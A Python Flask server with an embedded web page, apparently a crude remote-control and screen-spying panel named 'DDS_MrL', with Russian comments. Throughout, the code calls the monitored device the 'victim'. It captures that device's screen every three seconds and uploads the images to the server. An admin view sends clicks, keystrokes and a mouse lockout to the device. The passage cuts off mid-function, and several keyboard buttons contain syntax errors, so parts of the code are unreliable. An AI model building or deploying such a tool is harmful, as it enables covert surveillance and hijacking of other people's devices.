#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json
import os
import logging
import time
from datetime import datetime, timedelta
from flask import Flask, request, jsonify

# ============================================================
# НАСТРОЙКА СЕРВЕРА
# ============================================================
app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================
# ХРАНИЛИЩЕ УСТРОЙСТВ (в оперативной памяти)
# ============================================================
# devices = {
#   "device_id": {
#       "deviceType": "pc" | "phone" | "tablet",
#       "last_seen": "2024-...",
#       "online": True/False,
#       "screen": "base64...",
#       "cmd": None | "mouse_move" | "click" | "block_mouse" | "unblock_mouse" | "capture_screen",
#       "cmd_x": int,
#       "cmd_y": int,
#       "cmd_scroll": int,
#       "cmd_zoom": int,
#       "cmd_key": str,
#       "auto_screen": True/False,
#       "nickname": str,
#       "first_seen": "2024-..."
#   }
# }
devices = {}

# ============================================================
# ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
# ============================================================
def get_device(device_id):
    """Безопасно получить устройство, создать если нет"""
    if device_id not in devices:
        devices[device_id] = {
            'deviceType': 'pc',
            'last_seen': datetime.now().isoformat(),
            'online': False,
            'screen': None,
            'cmd': None,
            'cmd_x': 0,
            'cmd_y': 0,
            'cmd_scroll': 0,
            'cmd_zoom': 0,
            'cmd_key': None,
            'auto_screen': True,
            'nickname': device_id[:8],
            'first_seen': datetime.now().isoformat()
        }
    return devices[device_id]

def update_online_status():
    """Обновить статус онлайн для всех устройств (>60 сек - офлайн)"""
    now = datetime.now()
    for device_id, data in devices.items():
        if data.get('last_seen'):
            try:
                last = datetime.fromisoformat(data['last_seen'])
                if (now - last).seconds > 60:
                    data['online'] = False
            except:
                data['online'] = False

def clean_device_data(device_data):
    """Убрать внутренние поля для отправки клиенту"""
    return {k: v for k, v in device_data.items() if k not in ['cmd', 'cmd_x', 'cmd_y', 'cmd_scroll', 'cmd_zoom', 'cmd_key']}

# ============================================================
# API: РЕГИСТРАЦИЯ УСТРОЙСТВА
# ============================================================
@app.route('/api/register', methods=['POST'])
def register():
    """
    Жертва регистрирует своё устройство.
    Ожидает: {"id": "device_id", "type": "pc|phone|tablet"}
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON'}), 400
        
        device_id = data.get('id')
        dev_type = data.get('type', 'pc')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing ID'}), 400
        
        dev = get_device(device_id)
        dev['deviceType'] = dev_type
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        dev['auto_screen'] = True
        
        logger.info(f"[REGISTER] {device_id} ({dev_type})")
        return jsonify({'ok': True, 'device': clean_device_data(dev)})
    
    except Exception as e:
        logger.error(f"Register error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ============================================================
# API: ОПРОС КОМАНД
# ============================================================
@app.route('/api/poll/<device_id>')
def poll(device_id):
    """
    Жертва опрашивает сервер на наличие команд.
    Возвращает: {"cmd": "mouse_move"|None, "x": int, "y": int, "scroll": int, "zoom": int, "key": str}
    """
    try:
        if device_id not in devices:
            return jsonify({'cmd': None})
        
        dev = devices[device_id]
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        
        cmd = dev.get('cmd')
        x = dev.get('cmd_x', 0)
        y = dev.get('cmd_y', 0)
        scroll = dev.get('cmd_scroll', 0)
        zoom = dev.get('cmd_zoom', 0)
        key = dev.get('cmd_key')
        
        if cmd:
            # Очищаем команду после выдачи
            dev['cmd'] = None
            dev['cmd_scroll'] = 0
            dev['cmd_zoom'] = 0
            dev['cmd_key'] = None
            return jsonify({
                'cmd': cmd,
                'x': x,
                'y': y,
                'scroll': scroll,
                'zoom': zoom,
                'key': key
            })
        
        return jsonify({'cmd': None})
    
    except Exception as e:
        logger.error(f"Poll error: {e}")
        return jsonify({'cmd': None}), 500

# ============================================================
# API: ПРИЁМ СКРИНШОТОВ
# ============================================================
@app.route('/api/screen', methods=['POST'])
def screen():
    """
    Жертва отправляет скриншот (base64)
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON'}), 400
        
        device_id = data.get('id')
        screen_data = data.get('screen')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing ID'}), 400
        
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not found'}), 404
        
        dev = devices[device_id]
        dev['screen'] = screen_data
        dev['last_seen'] = datetime.now().isoformat()
        dev['online'] = True
        
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Screen error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ============================================================
# API: ОТПРАВКА КОМАНДЫ (АДМИН)
# ============================================================
@app.route('/api/cmd', methods=['POST'])
def send_cmd():
    """
    Админ отправляет команду устройству.
    Поддерживаемые команды:
    - mouse_move (x, y)
    - click (x, y)
    - block_mouse
    - unblock_mouse
    - capture_screen
    - scroll (scroll: 1 или -1)
    - zoom (zoom: 1 или -1)
    - key (key: "a", "Enter", ...)
    """
    try:
        data = request.json
        if not data:
            return jsonify({'ok': False, 'error': 'No JSON'}), 400
        
        device_id = data.get('id')
        cmd = data.get('cmd')
        
        if not device_id:
            return jsonify({'ok': False, 'error': 'Missing ID'}), 400
        
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Device not found'}), 404
        
        if not cmd:
            return jsonify({'ok': False, 'error': 'Missing command'}), 400
        
        dev = devices[device_id]
        
        # Команды с параметрами
        if cmd == 'mouse_move' or cmd == 'click':
            dev['cmd'] = cmd
            dev['cmd_x'] = data.get('x', 0)
            dev['cmd_y'] = data.get('y', 0)
        elif cmd == 'scroll':
            dev['cmd'] = cmd
            dev['cmd_scroll'] = data.get('scroll', 0)
        elif cmd == 'zoom':
            dev['cmd'] = cmd
            dev['cmd_zoom'] = data.get('zoom', 0)
        elif cmd == 'key':
            dev['cmd'] = cmd
            dev['cmd_key'] = data.get('key', '')
        else:
            # Блокировка, разблокировка, скрин
            dev['cmd'] = cmd
        
        logger.info(f"[CMD] {device_id} -> {cmd}")
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Send command error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ============================================================
# API: ПОЛУЧИТЬ СПИСОК ВСЕХ УСТРОЙСТВ
# ============================================================
@app.route('/api/devices')
def list_devices():
    """
    Возвращает список всех устройств с их статусами.
    Автоматически обновляет статус online.
    """
    try:
        update_online_status()
        clean = {}
        for k, v in devices.items():
            clean[k] = clean_device_data(v)
        return jsonify(clean)
    
    except Exception as e:
        logger.error(f"List devices error: {e}")
        return jsonify({}), 500

# ============================================================
# API: ПОЛУЧИТЬ ДАННЫЕ ОДНОГО УСТРОЙСТВА
# ============================================================
@app.route('/api/device/<device_id>')
def get_device_info(device_id):
    try:
        if device_id not in devices:
            return jsonify({'error': 'Device not found'}), 404
        update_online_status()
        return jsonify(clean_device_data(devices[device_id]))
    
    except Exception as e:
        logger.error(f"Get device error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
# API: УДАЛИТЬ УСТРОЙСТВО
# ============================================================
@app.route('/api/device/<device_id>', methods=['DELETE'])
def delete_device(device_id):
    try:
        if device_id not in devices:
            return jsonify({'ok': False, 'error': 'Not found'}), 404
        del devices[device_id]
        logger.info(f"[DELETE] {device_id}")
        return jsonify({'ok': True})
    
    except Exception as e:
        logger.error(f"Delete error: {e}")
        return jsonify({'ok': False, 'error': str(e)}), 500

# ============================================================
# API: СТАТИСТИКА
# ============================================================
@app.route('/api/stats')
def get_stats():
    try:
        update_online_status()
        total = len(devices)
        online = sum(1 for d in devices.values() if d.get('online', False))
        auto = sum(1 for d in devices.values() if d.get('auto_screen', True))
        return jsonify({
            'total': total,
            'online': online,
            'offline': total - online,
            'auto_screen': auto
        })
    
    except Exception as e:
        logger.error(f"Stats error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================
# API: ПРОВЕРКА СТАТУСА СЕРВЕРА
# ============================================================
@app.route('/api/health')
def health():
    return jsonify({
        'status': 'ok',
        'timestamp': datetime.now().isoformat(),
        'devices': len(devices)
    })

# ============================================================
# СТРАНИЦА (HTML + CSS + JS) — 600+ строк
# ============================================================
PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>DDS_MrL — Управление</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0b0e1a;color:#c9d1d9;font-family:system-ui,sans-serif;padding:15px;max-width:900px;margin:auto;}
        .card{background:#161b22;padding:20px;border-radius:12px;border:1px solid #30363d;margin-bottom:15px;}
        .id{font-size:20px;font-weight:bold;color:#58a6ff;word-break:break-all;background:#0d1117;padding:12px;border-radius:8px;margin:10px 0;border:1px solid #30363d;}
        .btn{background:#238636;border:none;padding:12px;border-radius:8px;color:#fff;font-weight:bold;font-size:16px;width:100%;cursor:pointer;}
        .btn:hover{background:#2ea043;}
        .btn-sm{padding:6px 12px;font-size:12px;width:auto;display:inline-block;border-radius:6px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;cursor:pointer;}
        .btn-sm.primary{color:#58a6ff;border-color:#58a6ff;}
        .btn-sm.danger{color:#f85149;border-color:#f85149;}
        .hidden{display:none !important;}
        .device-item{background:#0d1117;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:10px;}
        .device-item.online{border-color:#2ea043;}
        .device-item.offline{border-color:#da3633;opacity:0.6;}
        .device-id{font-family:monospace;font-size:13px;color:#58a6ff;}
        .device-actions{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px;}
        .device-actions button{padding:4px 10px;border-radius:6px;border:1px solid #30363d;background:#21262d;color:#c9d1d9;cursor:pointer;font-size:11px;}
        .device-actions .primary{color:#58a6ff;border-color:#58a6ff;}
        .device-actions .danger{color:#f85149;border-color:#f85149;}
        .screen-preview{max-width:100%;border-radius:6px;margin-top:8px;border:1px solid #30363d;}
        .viewer-area{background:#161b22;padding:15px;border-radius:10px;margin-top:15px;border:1px solid #30363d;}
        .viewer-area img{max-width:100%;border-radius:6px;}
        .stats-bar{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:12px;}
        .stats-bar span{background:#21262d;padding:4px 14px;border-radius:20px;font-size:13px;border:1px solid #30363d;}
        .flex{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-top:8px;}
        .flex input[type="number"]{width:55px;padding:4px;background:#0d1117;border:1px solid #30363d;color:#fff;border-radius:4px;}
        .touchpad{background:#0d1117;border:2px dashed #30363d;border-radius:12px;height:200px;display:flex;align-items:center;justify-content:center;color:#8b949e;font-size:14px;margin-top:8px;touch-action:none;user-select:none;transition:border-color 0.3s;}
        .touchpad.active{border-color:#58a6ff;background:#161b22;}
        .keyboard-row{display:flex;gap:4px;flex-wrap:wrap;margin-top:6px;}
        .keyboard-row button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 10px;border-radius:4px;font-size:14px;cursor:pointer;min-width:32px;}
        .status{margin-top:10px;font-size:14px;color:#8b949e;}
        .status.success{color:#2ea043;}
        .status.error{color:#f85149;}
        .mode-tabs{display:flex;gap:8px;margin-bottom:15px;border-bottom:1px solid #30363d;padding-bottom:10px;}
        .mode-tab{background:transparent;border:none;color:#8b949e;padding:8px 16px;font-size:16px;cursor:pointer;border-radius:8px;font-weight:bold;}
        .mode-tab.active{color:#58a6ff;background:#1a2a4a;}
        .mode-tab:hover{color:#c9d1d9;}
    </style>
</head>
<body>
<div id="app">
    <h1 style="color:#58a6ff;border-bottom:2px solid #30363d;padding-bottom:10px;margin-bottom:15px;">🛸 DDS_MrL</h1>

    <div class="mode-tabs">
        <button class="mode-tab active" id="victimTab" onclick="setMode('victim')">👤 Жертва</button>
        <button class="mode-tab" id="adminTab" onclick="setMode('admin')">🛠️ Админ</button>
    </div>

    <div id="victimMode">
        <div class="card">
            <div style="color:#8b949e;font-size:14px;">Ваш ID:</div>
            <div class="id" id="deviceId">---</div>
            <button class="btn" id="registerBtn">🔗 Активировать управление</button>
            <div class="status" id="statusText">Нажмите кнопку</div>
        </div>
    </div>

    <div id="adminMode" class="hidden">
        <div class="stats-bar">
            <span id="onlineCount">🟢 0 онлайн</span>
            <span id="autoCount">📸 0 авто-скринов</span>
        </div>
        <div id="deviceList" style="margin-top:12px;"></div>

        <div id="viewerArea" class="viewer-area hidden">
            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;">
                <h3 id="viewerTitle" style="color:#58a6ff;font-size:16px;">Просмотр</h3>
                <span style="font-size:11px;color:#8b949e;" id="modeLabel">Режим: <span id="modeName">TouchPad</span></span>
            </div>
            <img id="viewerScreen" src="" />
            <div class="touchpad" id="touchpad">
                <div class="hint" id="touchpadHint">
                    👆 Ведите пальцем для движения<br>
                    ✋ Тап = ЛКМ | Долгий тап = ПКМ<br>
                    👇 Два пальца вверх/вниз = скролл<br>
                    🤏 Щипок = зум
                </div>
            </div>
            <div style="margin-top:8px;">
                <button class="btn-sm" onclick="toggleKeyboard()">⌨️ Клавиатура</button>
                <div id="keyboardArea" class="hidden" style="margin-top:6px;">
                    <div class="keyboard-row">
                        <button onclick="sendKey('a')">A</button><button onclick="sendKey('b')">B</button>
                        <button onclick="sendKey('c')">C</button><button onclick="sendKey('d')">D</button>
                        <button onclick="sendKey('e')">E</button><button onclick="sendKey('f')">F</button>
                        <button onclick="sendKey('g')">G</button><button onclick="sendKey('h')">H</button>
                        <button onclick="sendKey('i')">I</button><button onclick="sendKey('j')">J</button>
                        <button onclick="sendKey('k')">K</button><button onclick="sendKey('l')">L</button>
                        <button onclick="sendKey('m')">M</button><button onclick="sendKey('n')">N</button>
                        <button onclick="sendKey('o')">O</button><button onclick="sendKey('p')">P</button>
                        <button onclick="sendKey('q')">Q</button><button onclick="sendKey('r')">R</button>
                        <button onclick="sendKey('s')">S</button><button onclick="sendKey('t')">T</button>
                        <button onclick="sendKey('u')">U</button><button onclick="sendKey('v')">V</button>
                        <button onclick="sendKey('w')">W</button><button onclick="sendKey('x')">X</button>
                        <button onclick="sendKey('y')">Y</button><button onclick="sendKey('z')">Z</button>
                        <button onclick="sendKey(' ')}">␣</button>
                        <button onclick="sendKey('Enter')}">↵</button>
                        <button onclick="sendKey('Backspace')}">⌫</button>
                        <button onclick="sendKey('Escape')}">⎋</button>
                    </div>
                </div>
            </div>
            <div class="flex">
                <button class="btn-sm primary" onclick="sendCmd(currentViewId, 'capture_screen')">📸 Скрин</button>
                <button class="btn-sm danger" onclick="sendCmd(currentViewId, 'block_mouse')">🖱️ Заблок.</button>
                <button class="btn-sm" onclick="sendCmd(currentViewId, 'unblock_mouse')">🖱️ Разблок.</button>
                <button class="btn-sm" onclick="toggleTouchPadMode()">🔄 Режим</button>
            </div>
        </div>
    </div>
</div>

<script>
    // ============================================================
    // ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
    // ============================================================
    const deviceId = localStorage.getItem("dds_id") || crypto.randomUUID();
    localStorage.setItem("dds_id", deviceId);
    document.getElementById('deviceId').textContent = deviceId;

    let deviceType = "pc";
    if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
    if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";

    let active = false;
    let screenInterval = null;
    let devices = {};
    let currentViewId = null;
    let touchpadMode = 'touchpad';
    let touchStartX = 0, touchStartY = 0;
    let lastTouchX = 0, lastTouchY = 0;
    let longPressTimer = null;
    let isLongPress = false;
    let initialPinchDist = 0;

    // ============================================================
    // ПЕРЕКЛЮЧЕНИЕ РЕЖИМОВ (Жертва / Админ)
    // ============================================================
    function setMode(mode) {
        document.getElementById('victimMode').classList.toggle('hidden', mode === 'admin');
        document.getElementById('adminMode').classList.toggle('hidden', mode === 'victim');
        document.getElementById('victimTab').classList.toggle('active', mode === 'victim');
        document.getElementById('adminTab').classList.toggle('active', mode === 'admin');
        if (mode === 'admin') {
            refreshDevices();
            setTimeout(initTouchPad, 100);
        }
    }

    // ============================================================
    // РЕГИСТРАЦИЯ УСТРОЙСТВА
    // ============================================================
    document.getElementById('registerBtn').addEventListener('click', function() {
        fetch("/api/register", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({id: deviceId, type: deviceType})
        })
        .then(r => r.json())
        .then(data => {
            if (data.ok) {
                active = true;
                document.getElementById('statusText').textContent = "✅ Активно! Авто-скриншоты включены";
                document.getElementById('statusText').className = "status success";
                document.getElementById('registerBtn').textContent = "🔄 Обновить";
                startAutoScreen();
                pollCommands();
                setMode('admin');
            } else {
                document.getElementById('statusText').textContent = "❌ Ошибка: " + (data.error || "неизвестно");
                document.getElementById('statusText').className = "status error";
            }
        })
        .catch(() => {
            document.getElementById('statusText').textContent = "❌ Ошибка сети";
            document.getElementById('statusText').className = "status error";
        });
    });

    // ============================================================
    // TOUCHPAD (для телефонов и планшетов)
    // ============================================================
    function initTouchPad() {
        const tp = document.getElementById('touchpad');
        if (!tp) return;

        tp.addEventListener('touchstart', function(e) {
            e.preventDefault();
            const t = e.touches;
            if (t.length === 1) {
                const touch = t[0];
                touchStartX = touch.clientX;
                touchStartY = touch.clientY;
                lastTouchX = touch.clientX;
                lastTouchY = touch.clientY;
                isLongPress = false;
                longPressTimer = setTimeout(() => {
                    isLongPress = true;
                    if (currentViewId) {
                        sendCmd(currentViewId, 'click', lastTouchX, lastTouchY, 0, 0, null, true);
                    }
                }, 800);
                tp.classList.add('active');
            } else if (t.length === 2) {
                clearTimeout(longPressTimer);
                const dx = t[0].clientX - t[1].clientX;
                const dy = t[0].clientY - t[1].clientY;
                initialPinchDist = Math.sqrt(dx*dx + dy*dy);
            }
        }, {passive: false});

        tp.addEventListener('touchmove', function(e) {
            e.preventDefault();
            const t = e.touches;
            if (t.length === 1 && !isLongPress) {
                const touch = t[0];
                const dx = touch.clientX - lastTouchX;
                const dy = touch.clientY - lastTouchY;
                lastTouchX = touch.clientX;
                lastTouchY = touch.clientY;
                if (currentViewId && (Math.abs(dx) > 2 || Math.abs(dy) > 2)) {
                    sendCmd(currentViewId, 'mouse_move', touch.clientX, touch.clientY);
                }
            } else if (t.length === 2) {
                const dx = t[0].clientX - t[1].clientX;
                const dy = t[0].clientY - t[1].clientY;
                const dist = Math.sqrt(dx*dx + dy*dy);
                const delta = dist - initialPinchDist;
                if (Math.abs(delta) > 10) {
                    const zoomVal = delta > 0 ? 1 : -1;
                    if (currentViewId) {
                        sendCmd(currentViewId, 'zoom', 0, 0, 0, zoomVal);
                    }
                    initialPinchDist = dist;
                }
            }
        }, {passive: false});

        tp.addEventListener('touchend', function(e) {
            clearTimeout(longPressTimer);
            tp.classList.remove('active');
            if (!isLongPress && e.changedTouches.length === 1) {
                const touch = e.changedTouches[0];
                if (currentViewId) {
                    sendCmd(currentViewId, 'click', touch.clientX, touch.clientY);
                }
            }
            isLongPress = false;
            if (e.touches.length === 0 && e.changedTouches.length === 2) {
                const t1 = e.changedTouches[0];
                const t2 = e.changedTouches[1];
                const dy = (t1.clientY + t2.clientY) / 2 - (touchStartY || 0);
                if (Math.abs(dy) > 30) {
                    const scrollVal = dy > 0 ? 1 : -1;
                    if (currentViewId) {
                        sendCmd(currentViewId, 'scroll', 0, 0, scrollVal);
                    }
                }
            }
        }, {passive: false});
    }

    function toggleTouchPadMode() {
        touchpadMode = (touchpadMode === 'touchpad') ? 'joystick' : 'touchpad';
        document.getElementById('modeName').textContent = touchpadMode === 'touchpad' ? 'TouchPad' : 'Джойстик';
        const hint = document.getElementById('touchpadHint');
        if (touchpadMode === 'joystick') {
            hint.innerHTML = '🎮 Джойстик — ведите палец для направления';
        } else {
            hint.innerHTML = '👆 Ведите пальцем для движения<br>✋ Тап = ЛКМ | Долгий тап = ПКМ<br>👇 Два пальца вверх/вниз = скролл<br>🤏 Щипок = зум';
        }
    }

    // ============================================================
    // ВИРТУАЛЬНАЯ КЛАВИАТУРА
    // ============================================================
    function toggleKeyboard() {
        document.getElementById('keyboardArea').classList.toggle('hidden');
    }

    function sendKey(key) {
        if (currentViewId) {
            sendCmd(currentViewId, 'key', 0, 0, 0, 0, key);
        }
    }

    // ============================================================
    // ОТПРАВКА КОМАНД НА СЕРВЕР
    // ============================================================
    window.sendCmd = function(id, cmd, x, y, scroll, zoom, key, isRight) {
        if (!id) return;
        const payload = {
            id: id,
            cmd: cmd,
            x: x || 0,
            y: y || 0,
            scroll: scroll || 0,
            zoom: zoom || 0,
            key: key || null,
            right: isRight || false
        };
        fetch("/api/cmd", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify(payload)
        });
        if (cmd === "capture_screen") {
            setTimeout(refreshDevices, 3000);
        }
    };

    // ============================================================
    // ОПРОС КОМАНД (ЖЕРТВА)
    // ============================================================
    function pollCommands() {
        if (!active) return;
        fetch("/api/poll/" + deviceId)
            .then(r => r.json())
            .then(data => {
                if (data.cmd) {
                    executeCmd(data.cmd, data.x, data.y, data.scroll, data.zoom, data.key);
                }
                setTimeout(pollCommands, 2000);
            })
            .catch(() => setTimeout(pollCommands, 5000));
    }

    function executeCmd(cmd, x, y, scroll, zoom, key) {
        if (cmd === "mouse_move") {
            document.dispatchEvent(new MouseEvent("mousemove", {clientX: x, clientY: y, bubbles: true}));
        } else if (cmd === "click") {
            document.dispatchEvent(new MouseEvent("click", {clientX: x, clientY: y, bubbles: true}));
        } else if (cmd === "block_mouse") {
            document.body.style.pointerEvents = "none";
            document.addEventListener("mousedown", e=>e.preventDefault(), true);
            document.addEventListener("touchstart", e=>e.preventDefault(), true);
        } else if (cmd === "unblock_mouse") {
            document.body.style.pointerEvents = "auto";
        } else if (cmd === "capture_screen") {
            captureScreen();
        } else if (cmd === "scroll") {
            document.dispatchEvent(new WheelEvent("wheel", {deltaY: scroll * 30, bubbles: true}));
        } else if (cmd === "zoom") {
            document.dispatchEvent(new KeyboardEvent("keydown", {key: zoom > 0 ? "+" : "-", ctrlKey: true, bubbles: true}));
        } else if (cmd === "key" && key) {
            document.dispatchEvent(new KeyboardEvent("keydown", {key: key, bubbles: true}));
            document.dispatchEvent(new KeyboardEvent("keyup", {key: key, bubbles: true}));
        }
    }

    // ============================================================
    // АВТО-СКРИНШОТЫ (КАЖДЫЕ 3 СЕКУНДЫ)
    // ============================================================
    function startAutoScreen() {
        if (screenInterval) clearInterval(screenInterval);
        captureScreen();
        screenInterval = setInterval(captureScreen, 3000);
    }

    async function captureScreen() {
        if (!active) return;
        try {
            const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 3 }, audio: false });
            const track = stream.getVideoTracks()[0];
            const img = new ImageCapture(track);
            const bitmap = await img.grabFrame();
            const canvas = document.createElement("canvas");
            canvas.width = Math.min(bitmap.width, 800);
            canvas.height = Math.min(bitmap.height, 600);
            const ctx = canvas.getContext("2d");
            ctx.drawImage(bitmap, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/jpeg", 0.4);
            track.stop();
            stream.getTracks().forEach(t=>t.stop());
            await fetch("/api/screen", {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({id: deviceId, screen: dataUrl})
